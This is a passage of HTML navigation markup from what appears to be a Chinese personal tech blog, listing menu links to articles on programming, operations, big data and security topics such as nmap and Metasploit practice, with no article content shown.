+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://github.com/triggergun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.zhihu.com/people/hong-lang-80-78/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  知乎
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://eglish.wutunan.top" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  英语
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.tc03vd.top/sunrise-sunset/zh/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  日出日落开放平台
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="/git/git.html" class="nav-link">
+  git
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="运维" class="dropdown-title"><span class="title">运维</span> <span class="arrow down"></span></button> <button type="button" aria-label="运维" class="mobile-dropdown-title"><span class="title">运维</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/运维/windows/cmd.html" class="nav-link">
+  命令
+</a></li><li class="dropdown-item"><!----> <a href="/network/network01.html" class="nav-link">
+  网络
+</a></li><li class="dropdown-item"><h4>
+          https原理实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/https/深入浅出https原理/02密码学.html" class="nav-link">
+  02)密码学
+</a></li></ul></li><li class="dropdown-item"><h4>
+          你真的安全吗？
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/security/windows/win10绕过密码.html" class="nav-link">
+  windows安全
+</a></li><li class="dropdown-subitem"><a href="/network/nmap/demo01_2025_11_11_01.html" class="nav-link">
+  nmap扫描实战
+</a></li><li class="dropdown-subitem"><a href="/network/password/demo01_2025_11_11_01.html" class="nav-link">
+  密码破解实战
+</a></li><li class="dropdown-subitem"><a href="/network/msf/demo01_2025_11_11_01.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  Metasploit(MSF)实战
+</a></li></ul></li><li class="dropdown-item"><h4>
+          shell运维
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/shell/demo01_2025_03_19_01.html" class="nav-link">
+  shell实战
+</a></li></ul></li><li class="dropdown-item"><h4>
+          linux基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/linux_base/demo01_2025_03_22_01.html" class="nav-link">
+  linux基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          nginx运维
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/nginx_base/demo01_2025_11_12_01.html" class="nav-link">
+  nginx常用命令
+</a></li></ul></li><li class="dropdown-item"><h4>
+          运维问题集
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/problem/demo01_2025_11_11_01.html" class="nav-link">
+  运维问题排错
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="java" class="dropdown-title"><span class="title">java</span> <span class="arrow down"></span></button> <button type="button" aria-label="java" class="mobile-dropdown-title"><span class="title">java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          java技术栈
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/javaSEBase/java.html" class="nav-link">
+  java基础
+</a></li><li class="dropdown-subitem"><a href="/java/gradle/01安装gradle.html" class="nav-link">
+  gradle
+</a></li><li class="dropdown-subitem"><a href="/java/maven/maven01_2025_10_19_01.html" class="nav-link">
+  maven
+</a></li></ul></li><li class="dropdown-item"><h4>
+          dao层框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/Mybatis/mybatis.html" class="nav-link">
+  mybatis
+</a></li><li class="dropdown-subitem"><a href="/java/mybatis_plus/03多数据库源的编写.html" class="nav-link">
+  mybatis-plus
+</a></li></ul></li><li class="dropdown-item"><h4>
+          源码分析区
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/spring源码分析/01Spring源码下载.html" class="nav-link">
+  spring源码分析
+</a></li><li class="dropdown-subitem"><a href="/java/springboot_source_code/20250105_demo01.html" class="nav-link">
+  spring-boot源码分析
+</a></li></ul></li><li class="dropdown-item"><h4>
+          springCloud
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/springcloudgateway/01gateway.html" class="nav-link">
+  gateway
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/java/designModel/AssemblerDesignPattern.html" class="nav-link">
+  设计模式
+</a></li><li class="dropdown-item"><!----> <a href="/java/java工具/xpath解析doc.html" class="nav-link">
+  java工具
+</a></li><li class="dropdown-item"><!----> <a href="/java/java基础服务/nexus/01nexus3的docker安装.html" class="nav-link">
+  java基础服务
+</a></li><li class="dropdown-item"><h4>
+          面试
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/interview/java/javaDemo01_2025_11_11_01.html" class="nav-link">
+  java面试
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="lyp" class="dropdown-title"><span class="title">lyp</span> <span class="arrow down"></span></button> <button type="button" aria-label="lyp" class="mobile-dropdown-title"><span class="title">lyp</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          javascript之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/javascript/01什么是事件.html" class="nav-link">
+  基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          微信小程序之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/小程序/微信小程序/01什么是小程序.html" class="nav-link">
+  微信小程序
+</a></li></ul></li><li class="dropdown-item"><h4>
+          c之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/c语言/安装devc++.html" class="nav-link">
+  c语言
+</a></li></ul></li><li class="dropdown-item"><h4>
+          C++之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/C++语言/01我的第一个C++程序/01如何创建工程.html" class="nav-link">
+  C++
+</a></li></ul></li><li class="dropdown-item"><h4>
+          db之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/db/mysql/mysql数据库总结/01添加唯一索引程序在添加数据.html" class="nav-link">
+  mysql实验总结
+</a></li></ul></li><li class="dropdown-item"><h4>
+          rust之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/rust语言/第一阶段基础篇/01rust是什么.html" class="nav-link">
+  第一阶段基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          python之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/python/第一阶段基础/01python的安装.html" class="nav-link">
+  第一阶段基础
+</a></li><li class="dropdown-subitem"><a href="/lyp/python/jupyter/demo01_2025_03_19_01.html" class="nav-link">
+  第二阶段基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          android之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/android/kotlin/demo01_2025_02_21.html" class="nav-link">
+  kotlin&amp;android
+</a></li></ul></li><li class="dropdown-item"><h4>
+          初见Go，星河初转。
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/go/demo01_2025_03_22_01.html" class="nav-link">
+  web华山论剑
+</a></li></ul></li><li class="dropdown-item"><h4>
+          再探前端，万籁生云。
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/前端/vue/demo01-20250430-01.html" class="nav-link">
+  vue转乾坤
+</a></li><li class="dropdown-subitem"><a href="/lyp/前端/layout/demo01_2025_04_23_01.html" class="nav-link">
+  风云涌动
+</a></li><li class="dropdown-subitem"><a href="/lyp/前端/base/demo01_20250527_01.html" class="nav-link">
+  前端基础
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="大数据" class="dropdown-title"><span class="title">大数据</span> <span class="arrow down"></span></button> <button type="button" aria-label="大数据" class="mobile-dropdown-title"><span class="title">大数据</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          hadoop基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/hadoop基本概念/阶段一/01MapReduce是什么.html" class="nav-link">
+  MapReduce理论
+</a></li></ul></li><li class="dropdown-item"><h4>
+          spark
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/02spark/01Spark集群安装与部署.html" class="nav-link">
+  spark集群
+</a></li><li class="dropdown-subitem"><a href="/lyp/大数据/scala语言基础/01scala简介.html" class="nav-link">
+  scala语言基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          zookeepre
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/zookeeper/01Zookeeper分布式集群部署.html" class="nav-link">
+  zookeepre集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          kafka
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/kafka/01Kafka集群部署与测试.html" class="nav-link">
+  kafka集群
+</a></li></ul></li><li class="dropdown-item"><h4>
+          大话flume
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/大数据/flume/base01/版本管理.html" class="nav-link">
+  flume
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="美工" class="dropdown-title"><span class="title">美工</span> <span class="arrow down"></span></button> <button type="button" aria-label="美工" class="mobile-dropdown-title"><span class="title">美工</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Adobe Photoshop
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/ps/01ps基础/01巧记ps快捷键.html" class="nav-link">
+  pa基础
+</a></li></ul></li><li class="dropdown-item"><h4>
+          office
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/word/practical/demo01_2025_10_10_01.html" class="nav-link">
+  word实用
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Adobe Premiere Pro
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/美工/pr/practical/demo01_2025_10_10_01.html" class="nav-link">
+  pr实用
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="基础科学" class="dropdown-title"><span class="title">基础科学</span> <span class="arrow down"></span></button> <button type="button" aria-label="基础科学" class="mobile-dropdown-title"><span class="title">基础科学</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          数学之美
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/基础科学/数学基础/02中等数学思想/球体体积公式推过程.html" class="nav-link">
+  中等数学思想
+</a></li></ul></li><li class="dropdown-item"><h4>
+          物理电学
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/基础科学/physical_base/middle_school_stage/demo01_2025_03_01.html" class="nav-link">
+  中等电学思想
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈架构" class="dropdown-title"><span class="title">谈架构</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈架构" class="mobile-dropdown-title"><span class="title">谈架构</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          云计算
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/cloud/demo01_2025_03_19_01.html" class="nav-link">
+  云原生
+</a></li></ul></li><li class="dropdown-item"><h4>
+          web架构
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/web/demo01_2025_04_01_01.html" class="nav-link">
+  web认证流程
+</a></li></ul></li><li class="dropdown-item"><h4>
+          人工智能
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/Introduction_to_Deep_Learning_4/chapter_01_20250601_01.html" class="nav-link">
+  深度学习入门
+</a></li></ul></li><li class="dropdown-item"><h4>
+          计算机组成原理
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/system_book01/chapter_01_20250601_0101.html" class="nav-link">
+  深入理解计算机操作系统
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Aiot
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/framework/iot/emqx/demo01_2015_10_10_01.html" class="nav-link">
+  emqx
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈游戏" class="dropdown-title"><span class="title">谈游戏</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈游戏" class="mobile-dropdown-title"><span class="title">谈游戏</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          第一步
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/game/unity_book01/demo01_2025_08_23_01.html" class="nav-link">
+  启蒙之书
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="谈前端" class="dropdown-title"><span class="title">谈前端</span> <span class="arrow down"></span></button> <button type="button" aria-label="谈前端" class="mobile-dropdown-title"><span class="title">谈前端</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          前端学习
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/roadmap/demo01_2025_10_02_01.html" class="nav-link">
+  学习路线
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搭建骨架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/html/demo01_2025_10_01_01.html" class="nav-link">
+  html初级之入路
+</a></li></ul></li><li class="dropdown-item"><h4>
+          外部装饰
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/css_basic/demo01_2025_10_01_01.html" class="nav-link">
+  css初级之入路
+</a></li></ul></li><li class="dropdown-item"><h4>
+          nuxt官方文档
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/front_end/nuxt_basic/demo01_2025_10_22_01.html" class="nav-link">
+  nuxt官方文档
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="数据库" class="dropdown-title"><span class="title">数据库</span> <span class="arrow down"></span></button> <button type="button" aria-label="数据库" class="mobile-dropdown-title"><span class="title">数据库</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/db/redis/demo01_2025_10_09_01.html" class="nav-link">
+  redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          postgre数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/db/postgre_sql_book/demo01_2025_10_10_01.html" class="nav-link">
+  postgre初级
+</a></li><li class="dropdown-subitem"><a href="/db/postgre_base_db/demo01_2025_10_10_01.html" class="nav-link">
+  postgre初级实战
+</a></li></ul></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
+  首页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="图南博客" class="dropdown-title"><span class="title">图南博客</span> <span class="arrow down"></span></button> <button type="button" aria-label="图南博客" class="mobile-dropdown-title"><span class="title">图南博客</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://ground-gun.gitee.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-first
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://wutunan.vercel.app/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Blog-second
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://gitee.com/ground-gun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Gitee
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://github.com/triggergun" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.zhihu.com/people/hong-lang-80-78/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  知乎
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://eglish.wutunan.top" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  英语
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.tc03vd.top/sunrise-sunset/zh/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  日出日落开放平台
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><a href="/git/git.html" class="nav-link">
+  git
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="运维" class="dropdown-title"><span class="title">运维</span> <span class="arrow down"></span></button> <button type="button" aria-label="运维" class="mobile-dropdown-title"><span class="title">运维</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/运维/windows/cmd.html" class="nav-link">
+  命令
+</a></li><li class="dropdown-item"><!----> <a href="/network/network01.html" class="nav-link">
+  网络
+</a></li><li class="dropdown-item"><h4>
+          https原理实战
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/https/深入浅出https原理/02密码学.html" class="nav-link">
+  02)密码学
+</a></li></ul></li><li class="dropdown-item"><h4>
+          你真的安全吗？
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/network/security/windows/win10绕过密码.html" class="nav-link">
+  windows安全
+</a></li><li class="dropdown-subitem"><a href="/network/nmap/demo01_2025_11_11_01.html" class="nav-link">
+  nmap扫描实战
+</a></li><li class="dropdown-subitem"><a href="/network/password/demo01_2025_11_11_01.html" class="nav-link">
+  密码破解实战
+</a></li><li class="dropdown-subitem"><a href="/network/msf/demo01_2025_11_11_01.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
+  Metasploit(MSF)实战
+</a></li></ul></li><li class="dropdown-item"><h4>
+          shell运维
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/shell/demo01_2025_03_19_01.html" class="nav-link">
+  shell实战
+</a></li></ul></li><li class="dropdown-item"><h4>
+          linux基础理论
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/linux_base/demo01_2025_03_22_01.html" class="nav-link">
+  linux基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          nginx运维
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/nginx_base/demo01_2025_11_12_01.html" class="nav-link">
+  nginx常用命令
+</a></li></ul></li><li class="dropdown-item"><h4>
+          运维问题集
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/运维/problem/demo01_2025_11_11_01.html" class="nav-link">
+  运维问题排错
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="java" class="dropdown-title"><span class="title">java</span> <span class="arrow down"></span></button> <button type="button" aria-label="java" class="mobile-dropdown-title"><span class="title">java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          java技术栈
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/javaSEBase/java.html" class="nav-link">
+  java基础
+</a></li><li class="dropdown-subitem"><a href="/java/gradle/01安装gradle.html" class="nav-link">
+  gradle
+</a></li><li class="dropdown-subitem"><a href="/java/maven/maven01_2025_10_19_01.html" class="nav-link">
+  maven
+</a></li></ul></li><li class="dropdown-item"><h4>
+          dao层框架
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/Mybatis/mybatis.html" class="nav-link">
+  mybatis
+</a></li><li class="dropdown-subitem"><a href="/java/mybatis_plus/03多数据库源的编写.html" class="nav-link">
+  mybatis-plus
+</a></li></ul></li><li class="dropdown-item"><h4>
+          源码分析区
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/spring源码分析/01Spring源码下载.html" class="nav-link">
+  spring源码分析
+</a></li><li class="dropdown-subitem"><a href="/java/springboot_source_code/20250105_demo01.html" class="nav-link">
+  spring-boot源码分析
+</a></li></ul></li><li class="dropdown-item"><h4>
+          springCloud
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/springcloudgateway/01gateway.html" class="nav-link">
+  gateway
+</a></li></ul></li><li class="dropdown-item"><!----> <a href="/java/designModel/AssemblerDesignPattern.html" class="nav-link">
+  设计模式
+</a></li><li class="dropdown-item"><!----> <a href="/java/java工具/xpath解析doc.html" class="nav-link">
+  java工具
+</a></li><li class="dropdown-item"><!----> <a href="/java/java基础服务/nexus/01nexus3的docker安装.html" class="nav-link">
+  java基础服务
+</a></li><li class="dropdown-item"><h4>
+          面试
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/java/interview/java/javaDemo01_2025_11_11_01.html" class="nav-link">
+  java面试
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="lyp" class="dropdown-title"><span class="title">lyp</span> <span class="arrow down"></span></button> <button type="button" aria-label="lyp" class="mobile-dropdown-title"><span class="title">lyp</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          javascript之路
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/lyp/javascript/01什么是事件.html" class="nav-link">
+  基础概念
+</a></li></ul></li><li class="dropdown-item"><h4>
+          微信小程序之路
